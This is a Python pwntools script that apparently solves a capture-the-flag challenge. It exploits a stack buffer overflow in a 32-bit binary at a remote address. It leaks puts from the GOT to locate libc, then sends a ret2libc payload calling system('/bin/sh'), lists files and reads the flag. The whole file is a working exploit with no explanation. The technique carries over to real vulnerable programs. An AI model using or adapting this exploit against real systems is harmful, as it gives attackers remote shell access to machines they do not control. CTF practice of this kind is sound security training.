from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/format')

# p = process('../file/format')
# libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

p = remote('61.147.171.105', '52946')
libc = ELF('../file/libc_32.so.6')

pause()

p.recvuntil(b'\n\n')

gee_addr = 0x08048888
payload = b'a' * 0x8c + p32(elf.plt['puts']) + p32(gee_addr) + p32(elf.got['puts'])
p.sendline(payload)

libc.address = u32(p.recv(4)) - libc.sym['puts']
system_addr = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh'))

# libc = LibcSearcher('puts', u32(p.recv(4)))
# system_addr = libc.dump('puts')
# binsh_addr = libc.dump('str_bin_sh')

payload = b'a' * 0x8c + p32(system_addr) + p32(0) + p32(binsh_addr)
p.sendline(payload)

p.sendline(b'ls -lh')
p.sendline(b'cat flag')

p.interactive()